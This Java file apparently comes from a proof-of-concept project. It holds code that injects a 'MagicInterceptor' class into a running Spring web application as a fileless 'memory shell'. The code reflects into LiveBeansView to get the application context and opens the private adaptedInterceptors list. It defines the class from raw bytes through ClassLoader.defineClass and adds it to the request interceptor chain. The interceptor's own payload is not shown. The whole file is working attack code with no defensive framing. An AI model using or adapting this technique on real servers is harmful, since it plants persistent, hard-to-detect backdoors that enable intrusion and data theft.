package asm.platform;

import asm.platform.common.util.encrypt.Base64Utils;

import java.lang.reflect.InvocationTargetException;

public class Test {

    public static void main(String []args) throws ClassNotFoundException, NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, NoSuchFieldException {
        // 1. 反射 org.springframework.context.support.LiveBeansView 类 applicationContexts 属性
        java.lang.reflect.Field filed = Class.forName("org.springframework.context.support.LiveBeansView").getDeclaredField("applicationContexts");
        // 2. 属性被 private 修饰，所以 setAccessible true
        filed.setAccessible(true);
        // 3. 获取一个 ApplicationContext 实例
        org.springframework.web.context.WebApplicationContext context = (org.springframework.web.context.WebApplicationContext) ((java.util.LinkedHashSet) filed.get(null)).iterator().next();


        org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping)context.getBean("requestMappingHandlerMapping");
        java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
        field.setAccessible(true);
        java.util.ArrayList<Object> adaptedInterceptors = (java.util.ArrayList<Object>)field.get(abstractHandlerMapping);

        String className = "MagicInterceptor";
        byte[] bytes = Base64Utils.fileToByte("D:\\pocProject\\asm-platform\\asm-platform-api\\target\\classes\\asm\\platform\\interceptor\\MagicInterceptor.class"); // magicInterceptor 类 class 的 base64 编码
        java.lang.ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        try {
            classLoader.loadClass(className);
        }catch (Exception e){
            java.lang.reflect.Method m0 = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
            m0.setAccessible(true);
            m0.invoke(classLoader, className, bytes, 0, bytes.length);
            adaptedInterceptors.add(classLoader.loadClass("MagicInterceptor").newInstance());
        }
    }
}
